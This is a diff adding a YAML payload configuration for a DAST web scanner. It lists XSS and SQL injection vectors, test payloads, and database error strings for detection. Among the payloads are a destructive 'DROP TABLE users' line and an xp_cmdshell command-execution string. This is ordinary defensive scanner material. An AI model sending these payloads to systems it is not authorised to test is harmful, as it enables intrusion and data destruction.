@@ -1,0 +1,106 @@
+# config/dast_payloads.yaml
+meta:
+  name: "Default DAST Payloads"
+  version: "1.1"
+  description: "قوائم بايلودز وتعريفات لمكونات فحص DAST: XSS، SQLi، ورسائل أخطاء مفيدة للفحص."
+
+
+xss_vectors:
+  - name: "Basic Script Tag Injection"
+    category: "Reflected XSS"
+    description: "Tests if a simple <script> tag can be injected and executed by the browser. This is the most fundamental XSS test."
+    goal: "Achieve arbitrary JavaScript execution."
+
+  - name: "HTML Event Handler Injection"
+    category: "Reflected XSS"
+    description: "Tests if an attacker can inject HTML tags with event handlers like 'onerror' or 'onload'. This is often used to bypass basic script tag filters."
+    goal: "Execute JavaScript without using a standard <script> tag."
+
+  - name: "SVG-based Vector"
+    category: "Reflected XSS"
+    description: "Tests for vulnerabilities by embedding a script within an SVG image element. This can bypass filters that only look for common HTML tags."
+    goal: "Leverage non-standard elements for script execution."
+
+sqli_vectors:
+  - name: "Tautology-based Injection (Always True)"
+    category: "In-band SQLi"
+    description: "Tests if the application is vulnerable to logic-based attacks by injecting a condition that is always true, like 'OR 1=1'. Often used to bypass authentication."
+    goal: "Manipulate the WHERE clause of a query to alter its logic."
+
+  - name: "Error-based Injection"
+    category: "In-band SQLi"
+    description: "Tests if the application reveals detailed database error messages when malformed queries are submitted. These errors can be used to map the database structure."
+    goal: "Force the database to leak information about its structure and version through error messages."
+
+  - name: "Comment-based Injection"
+    category: "In-band SQLi"
+    description: "Tests if SQL comment characters (like '--' or '#') can be used to truncate or neutralize the rest of the original query, allowing the attacker's injected code to execute cleanly."
+    goal: "Control the logic of the SQL query by commenting out parts of it."
+
+
+xss_payloads:
+  # basic reflective payloads
+  - "<script>alert(1)</script>"
+  - "\"><script>alert(1)</script>"
+  - "'\"><img src=x onerror=alert(1)>"
+  - "<svg/onload=alert(1)>"
+  - "<iframe src='javascript:alert(1)'></iframe>"
+  - "<script>/*'\"*/alert(String.fromCharCode(88,83,83))</script>"
+  - "<img src=x onerror=alert('XSS')>"
+  - "';alert(1);//"
+  - "<body onload=alert(1)>"
+  - "<details open ontoggle=alert(1)>"
+
+sqli_payloads:
+  # payloads that commonly trigger SQL errors or change logic
+  - "' OR '1'='1"
+  - "' OR 1=1 -- "
+  - "\" OR \"1\"=\"1\" -- "
+  - "'; DROP TABLE users; --"
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL, NULL--"
+  - "' OR SLEEP(5)--"                # used for time-based detection
+  - "'; WAITFOR DELAY '0:0:5'--"     # mssql time-based
+  - "\"; EXEC xp_cmdshell('whoami') --"
+  - "' OR 'a'='a"
+
+sqli_error_messages:
+ 
+  - "you have an error in your sql syntax"
+  - "mysql"
+  - "syntax error"
+  - "unclosed quotation mark"
+  - "quoted string not properly terminated"
+  - "sqlite_error"
+  - "sql error"
+  - "psql"
+  - "postgresql"
+  - "mysql_fetch"
+  - "ora-"
+  - "sqlstate"
+  - "warning: mysql"
+
+
+scan_config:
+  max_depth: 3
+  allow_paths: []          
+  ignore_exts:
+    - ".jpg"
+    - ".jpeg"
+    - ".png"
+    - ".gif"
+    - ".css"
+    - ".svg"
+    - ".ico"
+    - ".pdf"
+    - ".zip"
+
+
+vectors_to_payloads:
+  XSS:
+    - "<script>alert(1)</script>"
+    - "<svg/onload=alert(1)>"
+  SQLi:
+    - "' OR '1'='1"
+    - "' UNION SELECT NULL--"
+
